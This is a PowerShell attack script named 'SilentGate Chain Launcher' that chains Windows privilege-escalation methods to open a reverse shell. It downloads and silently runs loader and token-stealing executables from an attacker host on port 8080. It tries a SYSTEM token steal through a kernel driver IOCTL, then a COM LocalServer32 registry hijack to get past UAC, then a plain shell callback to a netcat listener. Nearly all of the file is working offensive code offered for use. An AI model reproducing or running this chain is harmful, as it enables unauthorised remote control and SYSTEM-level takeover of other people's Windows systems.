# =============================================================
# SilentGate - Unified Chain Launcher v1.0
# Author: JarDani
# Waterfall: tries highest privilege first, falls to lowest
# =============================================================
# Level 0: SYSTEM via steal_token.exe (excluded path)
# Level 1: SYSTEM via kernel IOCTL direct
# Level 2: COM LocalServer32 hijack (zero UAC)
# Level 3: Direct sg_loader.exe (medium shell)
# =============================================================

$kali  = "192.168.217.146"
$port  = 443
$lpe   = "C:\ProgramData\lpe"

# ── Bootstrap: ensure sg_loader.exe is available ──────────────
function Ensure-Loader {
    if(!(Test-Path $lpe)){
        New-Item -ItemType Directory -Path $lpe -Force | Out-Null
    }
    if(!(Test-Path "$lpe\sg_loader.exe")){
        try {
            Invoke-WebRequest -Uri "http://${kali}:8080/output/sg_loader.exe" `
                -OutFile "$lpe\sg_loader.exe" -ErrorAction Stop
        } catch {}
    }
}

# ── Launch shell quietly ───────────────────────────────────────
function Launch-Shell {
    if(Test-Path "$lpe\sg_loader.exe"){
        Start-Process "$lpe\sg_loader.exe" -WindowStyle Hidden
        return $true
    }
    return $false
}

# ── LEVEL 0: steal_token.exe from excluded path ───────────────
function Try-StealToken {
    Write-Host "[*] Level 0: SYSTEM via steal_token..."
    try {
        Invoke-WebRequest -Uri "http://${kali}:8080/tests/steal_token.exe" `
            -OutFile "$lpe\steal_token.exe" -ErrorAction Stop
        if(Test-Path "$lpe\steal_token.exe"){
            Start-Process "$lpe\steal_token.exe" -WindowStyle Hidden
            Start-Sleep 12
            Write-Host "[+] Level 0: steal_token launched"
            return $true
        }
    } catch { Write-Host "[-] Level 0 failed: $_" }
    return $false
}

# ── LEVEL 1: Kernel IOCTL token steal ─────────────────────────
function Try-KernelIOCTL {
    Write-Host "[*] Level 1: SYSTEM via kernel IOCTL..."
    try {
        Add-Type @"
using System;
using System.Runtime.InteropServices;
public class SGKernel {
    [DllImport("kernel32.dll",SetLastError=true)]
    public static extern IntPtr CreateFile(string n,uint a,uint s,IntPtr p,uint c,uint f,IntPtr t);
    [DllImport("kernel32.dll")]
    public static extern bool DeviceIoControl(IntPtr h,uint c,IntPtr i,uint il,IntPtr o,uint ol,ref uint nb,IntPtr ov);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@ -ErrorAction SilentlyContinue

        $h = [SGKernel]::CreateFile("\\.\SilentGate",
            [uint32]0xC0000000,0,[IntPtr]::Zero,3,0,[IntPtr]::Zero)
        if($h -ne [IntPtr]::new(-1) -and $h -ne [IntPtr]::Zero){
            $nb = [uint32]0
            $ok = [SGKernel]::DeviceIoControl($h,
                [uint32]0x00222410,[IntPtr]::Zero,0,
                [IntPtr]::Zero,0,[ref]$nb,[IntPtr]::Zero)
            [SGKernel]::CloseHandle($h) | Out-Null
            if($ok){
                Write-Host "[+] Level 1: SYSTEM token stolen"
                Launch-Shell | Out-Null
                Start-Sleep 8
                return $true
            }
        }
    } catch {}
    Write-Host "[-] Level 1 failed"
    return $false
}

# ── LEVEL 2: COM LocalServer32 hijack (Win10+Win11) ───────────
function Try-COMHijack {
    Write-Host "[*] Level 2: COM LocalServer32 hijack..."
    $clsid = "{32BA16FD-77D9-4AFB-9C9F-703E92AD4BFF}"
    try {
        New-Item -Path "HKCU:\Software\Classes\CLSID\$clsid\LocalServer32" `
            -Force | Out-Null
        Set-ItemProperty `
            -Path "HKCU:\Software\Classes\CLSID\$clsid\LocalServer32" `
            -Name "(default)" -Value "$lpe\sg_loader.exe"
        $type = [Type]::GetTypeFromCLSID($clsid)
        try { [Activator]::CreateInstance($type) } catch {}
        Start-Sleep 6
        Write-Host "[+] Level 2: COM hijack triggered"
        return $true
    } catch {
        Write-Host "[-] Level 2 failed: $_"
    } finally {
        Remove-Item "HKCU:\Software\Classes\CLSID\$clsid" `
            -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $false
}

# ── LEVEL 3: Direct medium shell fallback ─────────────────────
function Try-DirectShell {
    Write-Host "[*] Level 3: Direct medium shell..."
    if(Launch-Shell){
        Write-Host "[+] Level 3: Shell launched"
        return $true
    }
    Write-Host "[-] Level 3 failed - sg_loader.exe not found"
    return $false
}

# =============================================================
# MAIN CHAIN
# =============================================================
Write-Host ""
Write-Host "================================================"
Write-Host " SilentGate Chain Launcher"
Write-Host " Author: JarDani"
Write-Host " Target: ${kali}:${port}"
Write-Host "================================================"
Write-Host ""

Ensure-Loader

if(Try-StealToken)  { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-KernelIOCTL) { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-COMHijack)   { Write-Host "[*] Done - check Kali nc"; exit }
if(Try-DirectShell) { Write-Host "[*] Done - check Kali nc"; exit }

Write-Host "[-] All levels failed"
